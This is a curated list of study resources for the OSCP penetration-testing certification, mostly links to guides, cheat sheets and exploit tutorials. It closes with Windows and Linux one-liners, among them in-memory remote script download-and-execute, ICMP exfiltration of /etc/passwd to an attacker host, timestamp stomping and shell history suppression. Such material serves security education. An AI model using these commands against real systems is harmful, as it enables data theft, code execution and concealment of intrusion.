# OSCP-Archives

During my journey to getting the OSCP, I always come across many articles, Git repo, videos, and other types of sources of great and valuable information that helps me during my studies. While having all of these in a bookmark folder is great, I wanted to also build a curated list of the resources that I've collected overtime, all in one area for everyone to access.

This list will continue to grow over time as I come across new resources. If you know more resources or want me to add yours, please let me know and I'll add it in.

PS. A VERY big **thank you** to all the authors of these resources, for taking the time and energy putting this invaluable information together.

## Enjoy!


### ~ Official Exam Guide ~

[`OSCP Certification Exam Guide`](https://support.offensive-security.com/oscp-exam-guide/#exam-restrictions) - **Offensive Security**



### ~ Reviews and Experiences ~

[`31 Days of OSCP Experience`](https://0xdarkvortex.dev/index.php/2018/04/17/31-days-of-oscp-experience/) - **[ParanoidNinja](https://twitter.com/ninjaparanoid)**

[`Detailed Guide on OSCP Prep – From Newbie to OSCP`](http://niiconsulting.com/checkmate/2017/06/a-detail-guide-on-oscp-preparation-from-newbie-to-oscp/) - **Ramkisan Mohan**

[`Offensive Security Certified Professional – Lab and Exam Review`](https://theslickgeek.com/oscp/) - **[theslickgeek](https://twitter.com/theslickgeek)**

[`Passing The OSCP`](https://pinkysplanet.net/reflection-on-passing-the-oscp/amp/?__twitter_impression=true) - **[Pink_Panther](https://twitter.com/Pink_P4nther)**

[`OSCP Experience and the first torture!`](https://www.peerlyst.com/posts/oscp-experience-and-the-first-torture-nitesh-shilpkar-osce-oscp-oswp-ceh-crest) - **Nitesh Shilpkar**



### ~ Helpful VMs for Practice ~

[`Kioptrix`](https://sushant747.gitbooks.io/total-oscp-guide/content/) - **[loneferret](https://twitter.com/loneferret)**

[`OSCP-like Vulnhub VMs`](https://www.abatchy.com/2017/02/oscp-like-vulnhub-vms.html) - **[abatchy](https://twitter.com/abatchy17)**

[`OSCP Training VM’s hosted on Vulnhub.com`](https://medium.com/@andr3w_hilton/oscp-training-vms-hosted-on-vulnhub-com-22fa061bf6a1) - **Andrew Hilton**

[`Pinky's Palace CTFs`](https://pinkysplanet.net/tag/ctf/) - **[Pink_Panther](https://twitter.com/Pink_P4nther)**

[`Hack The Box OSCP-like VMs`](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159) - **[Tony](https://twitter.com/TJ_Null)**



### ~ CTF Walkthroughs & Educational Videos ~

[`Hack The Box CTFs`](https://www.youtube.com/ippsec) - **[ippsec](https://twitter.com/ippsec)**

[`Search Ippsec's Videos for Specific Topics`](https://ippsec.rocks/#) - **[ippsec](https://twitter.com/ippsec)**

[`Hack The Box, Over The Wire, Other CTFs`](https://www.youtube.com/derekrook) - **[derekrook](https://twitter.com/derekrook)**

[`VunHub Walkthroughs`](https://highon.coffee/blog/walkthroughs/) - **[Arr0way](https://twitter.com/Arr0way)**



### ~ OSCP Prep, Tools, Cheatsheets, Guides, etc. ~

[`Metasploit Unleashed`](https://www.offensive-security.com/metasploit-unleashed/) - **Offensive Security**

[`15 Ways to Download a File`](https://blog.netspi.com/15-ways-to-download-a-file/) - **[NetSPI](https://twitter.com/NetSPI)**

[`Explain Shell - Great at explaining Linux Commands in Detail`](https://www.explainshell.com/) - **Idan Kamara**

[`Mixed Archives`](https://blog.g0tmi1k.com/archives/) - **[g0tmi1k](https://twitter.com/g0tmi1k)**

[`OWASP Testing Guide v4 Table of Contents`](https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents) - **[owasp](https://twitter.com/owasp)**

[`Penetration Testing Tools Cheat Sheet`](https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/) - **[Arr0way](https://twitter.com/Arr0way)**

[`Reverse Shell Cheat Sheet`](https://highon.coffee/blog/reverse-shell-cheat-sheet/) - **[Arr0way](https://twitter.com/Arr0way)**

[`Linux Commands Cheat Sheet`](https://highon.coffee/blog/linux-commands-cheat-sheet/) - **[Arr0way](https://twitter.com/Arr0way)**

[`Reverse Shell Cheat Sheet`](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) - **Pentest Monkey**

[`Black Room Sec - CTFs, Guides, Tools`](https://www.blackroomsec.com/) - **[blackroomsec](https://twitter.com/blackroomsec)**

[`Dostoevskylabs's PenTest Notes`](https://dostoevskylabs.gitbooks.io/dostoevskylabs-pentest-notes/content/) - **Dostoevskylabs**

[`Pentest Compilation`](https://github.com/adon90/pentest_compilation) - **adon90**

[`SecLists`](https://github.com/danielmiessler/SecLists) - **danielmiessler**

[`OSCP-Prep`](https://github.com/burntmybagel/OSCP-Prep) - **burntmybagel**

[`OSCP-Prep`](https://github.com/rhodejo/OSCP-Prep) - **rhodejo**

[`OSCP Scripts`](https://github.com/garyhooks/oscp) - **garyhooks**

[`OSCP Scripts & Documents`](https://github.com/ihack4falafel/OSCP) - **ihack4falafel**

[`OSCP Recon Script`](https://github.com/xapax/oscp) - **xapax**

[`Cheatsheet-God`](https://github.com/OlivierLaflamme/Cheatsheet-God) - **OlivierLaflamme**

[`OSCP-Repo`](https://github.com/rewardone/OSCPRepo) - **rewardone**

[`Cheatsheets`](https://github.com/slyth11907/Cheatsheets) - **slyth11907**

[`OSCP tricks`](https://hackingandsecurity.blogspot.com/2017/09/oscp-tricks.html) - **WarLord**

[`Go-For-OSCP`](https://hackingandsecurity.blogspot.com/2017/08/go-for-oscp.html) - **WarLord**

[`How to prepare for the OSCP ? A STUDY PLAN`](https://www.peerlyst.com/posts/how-to-prepare-for-the-oscp-a-study-plan-magda-chelly-ph-d?utm_source=LinkedIn&utm_medium=Application_Share&utm_content=peerlyst_post&utm_campaign=peerlyst_shared_post) - **Magda CHELLY, CISSP, Ph.D**

[`OSCP useful Links`](https://backdoorshell.gitbooks.io/oscp-useful-links/content/) - **backdoorshell**

[`Total OSCP Guide`](https://sushant747.gitbooks.io/total-oscp-guide/content/) - **sushant747**

[`OSCP Course & Exam Preparation`](https://411hall.github.io/OSCP-Preparation/) - **[411Hall](https://twitter.com/411Hall)**

[`OSCP Journey: Python Code Challenges`](https://www.peerlyst.com/posts/oscp-journey-python-code-challenges-elias-ibrahim-cissp?utm_source=linkedin&utm_medium=social&utm_content=peerlyst_post&utm_campaign=peerlyst_shared_post) - **Elias Ibrahim**

[`SMB Enumeration Checklist`](https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html) - **[0xdf](https://twitter.com/0xdf_)**

[`Tunneling and Pivoting`](https://0xdf.gitlab.io/2018/11/02/pwk-notes-tunneling.html) - **[0xdf](https://twitter.com/0xdf_)**

[`Tunneling and Port Forwarding`](https://book.hacktricks.xyz/tunneling-and-port-forwarding) - **HackTricks**

[`Post-Exploitation Windows File Transfers with SMB`](https://0xdf.gitlab.io/2018/10/11/pwk-notes-post-exploitation-windows-file-transfers.html) - **[0xdf](https://twitter.com/0xdf_)**

[`Multiple Ways to Exploit Tomcat Manager`](https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/) - **[Raj Chande](https://twitter.com/rajchandel)**

[`PHP Web Shell`](https://github.com/WhiteWinterWolf/wwwolf-php-webshell) - **WhiteWinterWolf**

[`Msfvenom Cheat Sheet`](https://nitesculucian.github.io/2018/07/24/msfvenom-cheat-sheet/) - **[LucianNitescu](https://twitter.com/LucianNitescu)**

[`Linux Shells`](https://book.hacktricks.xyz/shells/linux) - **HackTricks**

[`Windows Shells`](https://book.hacktricks.xyz/shells/windows) - **HackTricks**

[`Dumping Clear-Text Credentials`](https://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/) - **Pentestlab**



### ~ Brute Force ~

[`Brute Force - CheatSheet`](https://book.hacktricks.xyz/brute-force) - **HackTricks**



### ~ Checklists ~

[`Checklist - Linux Privilege Escalation`](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist) - **HackTricks**

[`Checklist - Local Windows Privilege Escalation`](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation) - **HackTricks**



### ~ SQL Injection ~

[`Preliminary SQL Injection Part 1`](https://jtnydv.xyz/2018/12/25/preliminary-sql-injection-part-1/) - **Jatin Yadav**

[`Preliminary SQL Injection Part 2`](https://jtnydv.xyz/2018/12/27/preliminary-sql-injection-part-2/) - **Jatin Yadav**

[`Informix SQL Injection Cheat Sheet`](http://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet) - **pentestmonkey**

[`MSSQL Injection Cheat Sheet`](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet) - **pentestmonkey**

[`Oracle SQL Injection Cheat Sheet`](http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet) - **pentestmonkey**

[`MySQL SQL Injection Cheat Sheet`](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet) - **pentestmonkey**

[`Postgres SQL Injection Cheat Sheet`](http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet) - **pentestmonkey**

[`DB2 SQL Injection Cheat Sheet`](http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet) - **pentestmonkey**

[`Ingres SQL Injection Cheat Sheet`](http://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet) - **pentestmonkey**

[`SQL Injection Reference Library & Techniques`](http://www.sqlinjection.net/what-is/) - **SQLINjection**



### ~ Linux Privilege Escalation ~

[`OSCP - Linux Priviledge Escalation`](https://hackingandsecurity.blogspot.com/2017/09/oscp-linux-priviledge-escalation.html?m=1) - **WarLord**

[`Basic Linux Privilege Escalation`](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) - **[g0tmi1k](https://twitter.com/g0tmi1k)**

[`Linux Priv escalation`](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) - **carlospolop**

[`Linux Privilege Escalation`](https://book.hacktricks.xyz/linux-unix/privilege-escalation) - **HackTricks**



### ~ Windows Privilege Escalation ~

[`OSCP - Windows Priviledge Escalation`](https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html) - **WarLord**

[`Awesome-Windows-Exploitation`](https://github.com/enddo/awesome-windows-exploitation) - **enddo**

[`Windows Priv escalation`](https://github.com/kyawthiha7/oscp_notes/blob/master/windows_priv_escalation.md) - **kyawthiha7**

[`Windows Privilege Escalation Fundamentals`](http://www.fuzzysecurity.com/tutorials/16.html) - **[FuzzySec (b33f)](https://twitter.com/FuzzySec)**

[`Windows Priv escalation`](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) - **carlospolop**

[`Windows Local Privilege Escalation`](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation) - **HackTricks**



### ~ LFI & RFI ~

[`PHP Local and Remote File Inclusion (LFI, RFI) Attacks`](https://hackingandsecurity.blogspot.com/2017/09/php-local-and-remote-file-inclusion-lfi.html) - **WarLord**

[`LFI Cheat Sheet`](https://highon.coffee/blog/lfi-cheat-sheet/) - **[Arr0way](https://twitter.com/Arr0way)**



### ~ Exploits & Exploit Developtment, Tutorials ~

[`Windows & Linux Exploit Development`](http://www.fuzzysecurity.com/tutorials.html) - **[FuzzySec (b33f)](https://twitter.com/FuzzySec)**

[`Exploit DB`](https://www.exploit-db.com/) - **Offensive Security**

[`Exploit Development - Starting from Part 1`](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/) - **Corelan Team**

[`Over The Wire - Wargames`](http://overthewire.org/wargames/) - **OverTheWire**

[`Unix Privilege Escalation Exploits`](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack) - **Kabot**



### ~ Windows & linux Kernel Exploits ~

[`Windows Kernel Exploits`](https://github.com/SecWiki/windows-kernel-exploits) - **SecWiki**

[`Linux Kernel Exploits`](https://github.com/lucyoa/kernel-exploits) - **lucyoa**



#### **[SecuritySift](https://twitter.com/SecuritySift)**

[`Windows Exploit Development – Part 1: The Basics`](https://www.securitysift.com/windows-exploit-development-part-1-basics/)

[`Windows Exploit Development – Part 2: Intro-Stack-Overflow`](https://www.securitysift.com/windows-exploit-development-part-2-intro-stack-overflow/)

[`Windows Exploit Development – Part 3: Changing-Offsets-and-Rebased-Modules`](https://www.securitysift.com/windows-exploit-development-part-3-changing-offsets-and-rebased-modules/)

[`Windows Exploit Development – Part 4: Locating-Shellcode-Jumps`](https://www.securitysift.com/windows-exploit-development-part-4-locating-shellcode-jumps/)

[`Windows Exploit Development – Part 5: Locating-Shellcode-Egghunting`](https://www.securitysift.com/windows-exploit-development-part-5-locating-shellcode-egghunting/)

[`Windows Exploit Development – Part 6: Seh-Exploits`](https://www.securitysift.com/windows-exploit-development-part-6-seh-exploits/)

[`Windows Exploit Development – Part 7: Unicode-Buffer-Overflows`](https://www.securitysift.com/windows-exploit-development-part-7-unicode-buffer-overflows/)



#### **[shogun_lab](https://twitter.com/shogun_lab)**

[`Zero Day Zen Garden: Windows Exploit Development - Part 0 [Dev Setup & Advice]`](http://www.shogunlab.com/blog/2017/08/11/zdzg-windows-exploit-0.html) 

[`Zero Day Zen Garden: Windows Exploit Development - Part 1 [Stack Buffer Overflow Intro]`](http://www.shogunlab.com/blog/2017/08/19/zdzg-windows-exploit-1.html)

[`Zero Day Zen Garden: Windows Exploit Development - Part 2 [JMP to Locate Shellcode]`](http://www.shogunlab.com/blog/2017/08/26/zdzg-windows-exploit-2.html)

[`Zero Day Zen Garden: Windows Exploit Development - Part 3 [Egghunter to Locate Shellcode]`](http://www.shogunlab.com/blog/2017/09/02/zdzg-windows-exploit-3.html)

[`Zero Day Zen Garden: Windows Exploit Development - Part 4 [Overwriting SEH with Buffer Overflows]`](http://www.shogunlab.com/blog/2017/11/06/zdzg-windows-exploit-4.html)

[`Zero Day Zen Garden: Windows Exploit Development - Part 5 [Return Oriented Programming Chains]`](http://www.shogunlab.com/blog/2018/02/11/zdzg-windows-exploit-5.html)



### ~ Windows One-Liners ~ **[kindredsec](https://twitter.com/kindredsec)**
*Obtain Permission String from All Services*

`sc query state= all | findstr "SERVICE_NAME:" >> a & FOR /F "tokens=2 delims= " %i in (a) DO @echo %i >> b & FOR /F %i in (b) DO @(@echo %i & @sc sdshow %i & @echo ---------) & del a 2>nul & del b 2>nul`

*Obtain the path of the executable called by a Windows service (good for checking Unquoted Paths*

`sc query state= all | findstr "SERVICE_NAME:" >> a & FOR /F "tokens=2 delims= " %i in (a) DO @echo %i >> b & FOR /F %i in (b) DO @(@echo %i & @echo --------- & @sc qc %i | findstr "BINARY_PATH_NAME" & @echo.) & del a 2>nul & del b 2>nul`

*Forward traffic to an internal host*

`netsh interface portproxy add v4tov4 listenport=*port* listenaddress=*ip* connectport=*port* connectaddress=*ip`

*Download and execute a remote PowerShell script (all in-memory)*

`iex (New-Object Net.Webclient).DownloadString('*remote_file*')`

*Check the permissions of all binaries associated with services*

`$list = Get-WmiObject win32_service | select -ExpandProperty PathName | Select-String -NotMatch svchost; foreach ( $path in $list ) { icacls $path 2>null | Select-String -NotMatch "Successfully processed" }`

*Enable RDP (may also need firewall rule)*

`reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`



### ~ Linux One-Liners ~ **[kindredsec](https://twitter.com/kindredsec)**
*Stomp a timestamp to match other install-time files*

`touch -a -m -t $(stat -c '%y' /bin/bash | cut -d ":" -f 1,2 | sed 's/[- :]//g') malicious_file.sh`

*Prevent ran bash commands from being written to a history file*

`export HISTFILE=/dev/null`

*Exfiltrate users over ICMP*

`while read line; do ping -c 1 -p $(echo "$line" | cut -d ":" -f 1,2,3,7 | xxd -ps) my_attacking_host; done < /etc/passwd`

*Locate mySQL credentials within web files*

`egrep -ri '(mysql_connect\(|mysqli_connect\(|new mysqli\(|PDO\(\"mysql:)' /var/www/* 2> /dev/null`

*List all the SUID Binaries on a System*

`find / -perm -4000 2>/dev/null`

*Creates iptables rules to transparently route traffic destined to a specific port to an internal host*

`iptables -t nat -A PREROUTING -i *interface* -p tcp --dport *port* -j DNAT --to-destination *remote_ip_address* & iptables -t nat -A POSTROUTING -o *interface* -p tcp --dport *port* -d *remote_ip_address* -j SNAT --to-source *local_ip_address*`

*List all running processes being ran by users other than your current one*

`ps -elf | grep -v $(whoami)`

*List all system cronjobs*

`for i in d hourly daily weekly monthly; do echo; echo "--cron.$i--"; ls -l /etc/cron.$i; done`